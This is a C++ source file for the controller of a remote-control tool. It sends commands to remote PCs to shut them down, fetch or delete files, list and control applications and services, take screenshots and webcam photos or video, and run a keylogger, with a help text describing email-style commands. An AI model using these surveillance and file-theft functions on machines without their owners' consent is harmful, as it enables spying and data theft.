#include "client_cmd.h"


const std::string Command::directory = "temp\\";

bool Command::validateParameter() const{
    return true;
}

void Command::setCommandInfo(const std::string& ip, const std::string& command, const std::string& param){
    this->ip = ip;
    this->command = command;
    this->parameter = param;
}

bool Command::sendCommand(Client& client){
    SOCKET server_socket = client.getServerSocket(ip);
    std::string send_string = command + '-' + parameter;

    if (send(server_socket, send_string.c_str(), send_string.length(), 0) == SOCKET_ERROR){
        json j;
        j["status"] = FAILURE;
        j["message"] = "An error occured while sending the command to server.\nThe server may be down.";
        j["file"] = "";
        response = j.dump();
        return 0;
    }
    return 1;
}  

std::string Command::getResponse(){
    std::string temp = response;
    response.clear();
    return temp;
}

//*Shutdown Command
void ShutdownCommand::execute(Client& client){
    if (sendCommand(client)){
        response = client.receiveResponse(ip);
    }
}


void RestartCommand::execute(Client& client){
    if (sendCommand(client)){
        response = client.receiveResponse(ip);
    }
}

//*Get File Command
void GetFileCommand::execute(Client& client){
    if (!validateParameter()){
        json j;
        j["status"] = FAILURE;
        j["message"] = "Invalid file path, please try again.";
        j["file"] = "";
        response = j.dump();
        return;
    }
        
    if (sendCommand(client)){
        receiveFile(client, ip, directory);
        response = client.receiveResponse(ip);
    }
}

bool GetFileCommand::validateParameter() const {
    if (parameter.find(":\\") == 1 && parameter.find('/') == std::string::npos)
        return true;
    return false;
}

//*Delete File Command
void DeleteFileCommand::execute(Client& client){
    if (!validateParameter()){
        json j;
        j["status"] = FAILURE;
        j["message"] = "Invalid file path, please try again.";
        j["file"] = "";
        response = j.dump();
        return;
    }
        
    if (sendCommand(client)){
        response = client.receiveResponse(ip);
    }
}

bool DeleteFileCommand::validateParameter() const {
    if (parameter.find(":\\") == 1 && parameter.find('/') == std::string::npos)
        return true;
    return false;
}

//* List File Command
void ListFileCommand::execute(Client& client){
    if (!validateParameter()){
        json j;
        j["status"] = FAILURE;
        j["message"] = "Invalid file path, please try again.";
        j["file"] = "";
        response = j.dump();
        return;
    }
        
    if (sendCommand(client)){
        receiveFile(client, ip, directory);
        response = client.receiveResponse(ip);
    }
}

bool ListFileCommand::validateParameter() const {
    if (parameter.find(":\\") == 1 && parameter.find('/') == std::string::npos)
        return true;
    return false;
}

void ListAppCommand::execute(Client& client){
    if (sendCommand(client)){
        receiveFile(client, ip, directory);
        response = client.receiveResponse(ip);
    }
}

void StartAppCommand::execute(Client& client){
    if (!validateParameter()){
        json j;
        j["status"] = FAILURE;
        j["message"] = "Missing application name, please try again.";
        j["file"] = "";
        response = j.dump();
        return;
    }

    if (sendCommand(client)){
        response = client.receiveResponse(ip);
    }
}

bool StartAppCommand::validateParameter() const {
    if(!parameter.empty())
        return true;
    return false;
}

void StopAppCommand::execute(Client& client){
    if (!validateParameter()){
        json j;
        j["status"] = FAILURE;
        j["message"] = "Missing application ID, please try again.";
        j["file"] = "";
        response = j.dump();
        return;
    }

    if (sendCommand(client)){
        response = client.receiveResponse(ip);
    }
}

bool StopAppCommand::validateParameter() const {
    if(!parameter.empty())
        return true;
    return false;
}


void ScreenshotCommand::execute(Client& client){
    if (sendCommand(client)){
        receiveFile(client, ip, directory);
        response = client.receiveResponse(ip);
    }
}

void GetIPsCommand::execute(Client& client){
    std::string message;
    message = "List of available IPs:";

    for (auto ip : client.getIPList()) {
        message += "\n- " + ip;
    }

    json j;
    j["status"] = SUCCESS;
    j["message"] = message;
    j["file"] = "";

    response = j.dump();
}



void ListSerCommand::execute(Client& client) {
    if (sendCommand(client)){
        receiveFile(client, ip, directory);
        response = client.receiveResponse(ip);
    }
}

void TakePhotoCommand::execute(Client& client){
    if (sendCommand(client)){
        receiveFile(client, ip, directory);
        response = client.receiveResponse(ip);
    }
}

void StartKeylogCommand::execute(Client& client) {
    if (sendCommand(client)){
        response = client.receiveResponse(ip);
    }
}

void StopKeylogCommand::execute(Client& client) {
    if (sendCommand(client)){
        if (client.receiveResponse(ip) == "RUNNING") {
            receiveFile(client, ip, directory);
        }
        response = client.receiveResponse(ip);
    }
}


void HelpCommand::execute(Client& client) {
    std::string help_text = R"(List of available commands:

1/ Help:
- Subject: help
- Return list of available commands

2/ Get IPs
- Subject: getips
- Return list of available computers and their IP andress

3/ Shutdown:
- Subject: shutdown
- Body: IP (line 1)

4/ Restart:
- Subject: restart
- Body: IP (line 1)

5/ Application:
a/ List Applications
- Subject: listapps
- Body: IP (line 1)
- Return list of running applications in .txt

b/ Start Application:
- Subject: startapp
- Body: IP (line 1), Application name (line 2)

c/ Stop Application:
- Subject: stopapp
- Body: IP (line 1), Application's PID (line 2)

6/ Service:
a/ List Services
- Subject: listsers
- Body: IP (line 1)
- Return list of running services in .txt

b/ Start Service:
- Subject: startser
- Body: IP (line 1), service name (line 2)

c/ Stop Service:
- Subject: stopser
- Body: IP (line 1), service name (line 2)

7/ File:
a/ List File
- Subject: listfiles
- Body: IP (line 1), directory path (line 2)
- Return list of files in .txt

b/ Get file
- Subject: getfile
- Body: IP (line 1), file path (line 2)
- Return file as attachment

c/ Delete File:
- Subject: delfile
- Body: IP (line 1), file path (line 2)

8/ Screenshot
- Subject: screenshot
- Body: IP (line 1)
- Return screenshot as attachment

9/ Webcam
a/ Take a photo
- Subject: takephoto
- Body: IP (line 1)
- Return photo as attachment

b/ Start recording video
- Subject: startrecord
- Body: IP (line 1)

c/ Stop recording video
- Subject: stoprecord
- Body: IP (line 1)
- Return video as attachment
- Require startrecord to be called before, maximum video size: 23MB

10/ Keylogger
a/ Start recording keystroke
- Subject: startkeylog
- Body: IP (line 1)

b/ Stop recording keystroke
- Subject: stopkeylog
- Body: IP (line 1)
- Return keystroke as attachment
- Require startkeylog to be called before, maximum time length: 300 seconds)";

    json j;
    j["status"] = SUCCESS;
    j["message"] = help_text;
    j["file"] = "";
    response = j.dump();
}

void StartSerCommand::execute(Client& client){
    if (!validateParameter()){
        json j;
        j["status"] = 1;
        j["message"] = "Missing service name, please try again.";
        j["file"] = "";

        response = j.dump();
        return;
    }

    if (sendCommand(client)){
        response = client.receiveResponse(ip);
    }
}

bool StartSerCommand::validateParameter() const{
    if(parameter.empty())
        return false;
    return true;
}

void StopSerCommand::execute(Client& client){
    if (!validateParameter()){
        json j;
        j["status"] = FAILURE;
        j["message"] = "Missing service name, please try again.";
        j["file"] = "";

        response = j.dump();
        return;
    }

    if (sendCommand(client)){
        response = client.receiveResponse(ip);
    }
}

bool StopSerCommand::validateParameter() const{
    if(parameter.empty())
        return false;
    return true;
}

void StartRecordCommand::execute(Client& client){
    if (sendCommand(client)){
        response = client.receiveResponse(ip);
    }
}

void StopRecordCommand::execute(Client& client){
    if (sendCommand(client)){
        if (client.receiveResponse(ip) == "RUNNING") {
            receiveFile(client, ip, directory);
        }
        response = client.receiveResponse(ip);
    }
}